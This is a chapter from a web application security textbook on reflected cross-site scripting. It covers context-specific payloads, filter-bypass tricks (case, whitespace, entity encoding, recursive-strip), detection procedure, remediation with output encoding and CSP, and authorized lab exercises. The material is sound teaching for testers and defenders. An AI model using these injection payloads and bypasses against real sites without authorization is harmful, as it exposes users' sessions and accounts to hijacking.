# Chapter 8 — Reflected XSS

> Reflected cross-site scripting is HTML injection that reaches JavaScript execution, where the
> payload travels in the *request* and bounces back in the *immediate response*. It's the most
> common XSS to find and the easiest to demonstrate — and the discipline of context-driven
> payload crafting you learn here carries into stored and DOM XSS.

---

## 8.1 What "reflected" means

In reflected XSS, the malicious input is part of the request (typically a URL parameter or form
field) and the server includes it, unsanitized, in the HTTP response it returns *right away*.
The payload is not stored; it executes only for whoever makes that specific request.

The attack therefore requires **delivery**: the attacker must get the victim to send the
crafted request, usually by getting them to click a crafted link (in email, chat, a comment, a
malicious ad) or by auto-submitting a form. Because it rides a single request/response, it's
sometimes called "non-persistent" XSS.

```
Attacker crafts URL:  https://app.example/search?q=<payload>
Victim clicks it →    browser sends request →    server reflects <payload> in HTML →
browser parses it →   payload executes in app.example's origin
```

That last line is the whole point: the script runs **in the target's origin**, with the
victim's session (Chapter 4). Reflected XSS is not "just an alert."

## 8.2 The reflected XSS lifecycle for a tester

1. **Find a reflection** of your marker in the immediate response (Chapter 6).
2. **Determine context + encoding** (Chapter 2).
3. **Craft a context-appropriate break-out** that introduces script execution.
4. **Confirm execution** with a benign signal.
5. **Assess impact and delivery**, then **document**.

The hard part is steps 2–3, and they are *entirely* about context. Let's go context by context.

## 8.3 Context-driven payloads

The benign confirmation we'll use throughout is intentionally harmless — e.g.,
`alert(document.domain)` (proves execution *and* the origin in one shot) or
`console.log('xss-zqxj')` (quiet). In a real engagement prefer the quietest signal that proves
the point; see [Chapter 1](../01-legal-and-ethics.md).

### (a) HTML element content

The template:
```html
<div>HERE</div>
```
If `<` and `>` are not encoded, just introduce an executing element. `<script>` works when the
response is parsed as a fresh document, but event-handler vectors are more reliable across
sinks:
```html
<svg onload=alert(document.domain)>
<img src=x onerror=alert(document.domain)>
```
`<svg onload>` is a favorite: short, no external resource needed, fires on parse.

### (b) Quoted attribute value

The template:
```html
<input type="text" value="HERE">
```
You must first close the attribute and (usually) the tag, then inject:
```
"><svg onload=alert(document.domain)>
```
If only the attribute can be broken but not the tag, add a new event-handler attribute instead:
```
" autofocus onfocus=alert(document.domain) x="
```
`autofocus` makes it fire without user interaction (Chapter 5).

### (c) Single-quoted / unquoted attribute value

Single-quoted needs a `'` to break out:
```
' autofocus onfocus=alert(document.domain) x='
```
Unquoted values end at whitespace, so you don't even need a quote — a space starts a new
attribute:
```
template: <input value=HERE>
input:    x onfocus=alert(document.domain) autofocus
```

### (d) Inside an existing event handler

The template:
```html
<button onclick="greet('HERE')">
```
You're already in JavaScript string context. Break the string and inject statements:
```
');alert(document.domain);//
```
Remember (Chapter 3): HTML-entity encoding does **nothing** here. If the app HTML-encoded the
value but left it in a JS context, you likely still execute.

### (e) Inside a `<script>` block

The template:
```html
<script> var q = "HERE"; </script>
```
Two routes:
- **Stay in JS** and break the string/statement:
  ```
  ";alert(document.domain);//
  ```
- **Escape the script element entirely** with a literal `</script>` and start fresh markup:
  ```
  </script><svg onload=alert(document.domain)>
  ```
The second works even when the app encoded quotes, because `</script>` ends the raw-text
element at the *tokenizer* level (Chapter 3).

### (f) URL / `href` context

The template:
```html
<a href="HERE">link</a>
```
HTML-entity encoding won't save this; use a script scheme:
```
javascript:alert(document.domain)
```
If a filter blocks the literal `javascript:`, recall attribute-context entity decoding
(Chapter 3): `javascript&#58;alert(document.domain)` may decode after the filter. Whitespace
and case tricks (`java\tscript:`, `JaVaScRiPt:`) also bypass naive matchers.

### (g) `<textarea>` / `<title>` (RCDATA)

Close the special element first, then inject:
```
</textarea><svg onload=alert(document.domain)>
</title><svg onload=alert(document.domain)>
```

The meta-skill, again: **what ends this context? Emit it, then inject an executing construct.**

## 8.4 Escalating past filters

When a naive filter blocks your first attempt, characterize it (Chapter 7 §7.7) and adapt.
Common, legitimate bypass families:

- **Case variation:** `<ScRiPt>`, `oNeRRoR`.
- **Whitespace/separators:** `<img/src=x/onerror=...>`, tabs/newlines inside the tag.
- **Tag/attribute alternatives:** if `onerror` is blocked, try `onload`, `onfocus`+`autofocus`,
  `onpointerover`, `onanimationstart`+CSS animation, `ontoggle` on `<details open>`.
- **No-`script` vectors:** `<svg>`, `<img>`, `<details>`, `<marquee>`, `<video>`, `<audio>` all
  carry event handlers — useful when `<script>` is filtered or CSP blocks inline `<script>`
  but allows event attributes (a misconfiguration).
- **Entity/encoding:** entity-encode payload characters in attribute/URL contexts where they're
  decoded (Chapter 3).
- **Recursive-strip:** `<scr<script>ipt>` against filters that strip once without re-scanning.
- **Charset confusion:** on legacy stacks, alternate encodings (Chapter 3 §3.9).

Each bypass is just exploiting a mismatch between the filter's model of HTML and the browser's
*actual* parsing — the central theme of this book. Use these only against authorized targets.

## 8.5 Reflected XSS in non-obvious places

Reflections aren't only in HTML bodies:

- **In JSON responses rendered as HTML.** An API returns JSON that a page injects via
  `innerHTML` — server "reflected" into a client sink (this blurs into DOM XSS, Chapter 10).
- **In error messages** ("`<your input>` is invalid").
- **In HTTP headers reflected into the body** (e.g., a `Referer`-driven "back" link, or
  `User-Agent` echoed in a debug page).
- **In `Content-Type: text/html` responses that shouldn't be HTML** — e.g., a file download or
  API endpoint served as HTML, where reflected input becomes markup. Combined with missing
  `X-Content-Type-Options: nosniff`, even non-HTML responses can be sniffed into HTML.
- **In PDFs/SVGs/other generated documents** rendered in the browser.

Map all of these (Chapter 6); reflected XSS hides outside the obvious search box.

## 8.6 Method and parameter considerations

- **GET-based reflected XSS** is the easiest to weaponize because the entire payload fits in a
  clickable URL — ideal (for an attacker) for phishing delivery. Prioritize these for impact.
- **POST-based reflected XSS** requires the attacker to auto-submit a form from a page they
  control (an HTML form with the right fields, JavaScript-submitted). Still exploitable, just
  needs a delivery page. Note this also intersects CSRF protections.
- **Header-based reflected XSS** (e.g., reflected `Referer`/`X-Forwarded-For`) needs a way to
  control that header in the victim's request, which constrains delivery but is sometimes
  possible.

Document the delivery requirements honestly in your report; they affect severity.

## 8.7 Confirming execution responsibly

To prove execution without harm:

- Prefer `alert(document.domain)` — it simultaneously proves *execution* and *which origin*
  you're running in (important when subdomains/sandboxes are involved).
- For quieter confirmation in shared environments, `console.log` a unique token or set
  `document.title`.
- **Do not** dump cookies to an external server, pivot into other users' sessions, or run
  destructive actions to "prove impact" unless your scope explicitly authorizes it and you use
  accounts you control. The existence of execution *is* the finding; impact can be described
  without realizing it.

## 8.8 Detecting reflected XSS (procedure)

1. For each reflection (Chapter 6), classify context + encoding.
2. Submit context-specific probes (e.g., `"><b>zqxj</b>` for attribute breakout) and watch the
   rendered DOM.
3. If markup interprets, escalate to a benign executing payload appropriate to the context.
4. Confirm with a harmless signal; capture request + response + screenshot.
5. Note delivery method (GET link vs POST form vs header) and any filter you bypassed.
6. Check CSP: even if you execute, note whether CSP *should* have stopped it (a finding either
   way — vulnerable code, or weak CSP, or both).

Automated scanners (Chapter 16) catch many reflected XSS, but context-aware manual testing
finds the ones they miss (script context, attribute breakouts requiring specific characters,
filter bypasses).

## 8.9 Fixing reflected XSS

Same core fix as all injection (full treatment in [Chapter 18](../part6/18-defense-remediation.md)):

- **Context-appropriate output encoding** at the point the data is written into the response.
  HTML-encode for element/attribute contexts; JavaScript-string-encode for script contexts;
  URL-validate for URL contexts. Use framework auto-escaping and avoid "raw" escape hatches.
- **Validate and canonicalize input** as a secondary measure (allow-list expected formats), but
  never *instead* of output encoding.
- **Set a strong CSP** (Chapter 19) so that inline/event-handler payloads don't run even if a
  reflection slips through. A nonce/hash-based `script-src` without `'unsafe-inline'` neutralizes
  most reflected XSS as defense in depth.
- **Add `X-Content-Type-Options: nosniff`** and correct `Content-Type`s so non-HTML responses
  can't be coerced into HTML.

## 8.10 Lab exercise

Using PortSwigger's Web Security Academy reflected-XSS labs or DVWA:

1. Solve the **element-content** case with `<svg onload=alert(document.domain)>`.
2. Solve an **attribute** case requiring `"`-breakout and `autofocus`+`onfocus`.
3. Solve a **`<script>`-context** case both by JS-string breakout and by `</script>` escape.
4. Solve a **filtered** case by characterizing the blocklist and using a case/whitespace/entity
   bypass.
5. For each, note exactly which character the encoding *should* have neutralized.

Doing all four cements that the payload is a function of context — the thesis of Part III.

---

## Key takeaways

- Reflected XSS = payload in the request, echoed into the immediate response, executing in the
  victim's origin. It requires **delivery** (usually a crafted link).
- The payload is **dictated by context**: element content, quoted/unquoted/single-quoted
  attribute, existing event handler, `<script>` block, URL, or RCDATA. Learn the break-out for
  each.
- Filters are bypassable through case, whitespace, alternative event handlers/elements, entity
  decoding in attribute/URL contexts, and recursive-strip tricks — all exploiting parser/filter
  mismatches.
- Confirm with a **benign** signal (`alert(document.domain)`); don't realize impact without
  explicit authorization.
- Fix with context-appropriate **output encoding**, framework auto-escaping, strong **CSP**, and
  correct content types.

---

[← Previous: Chapter 7 — HTML Injection](07-html-injection.md) | [Next: Chapter 9 — Stored XSS →](09-xss-stored.md)
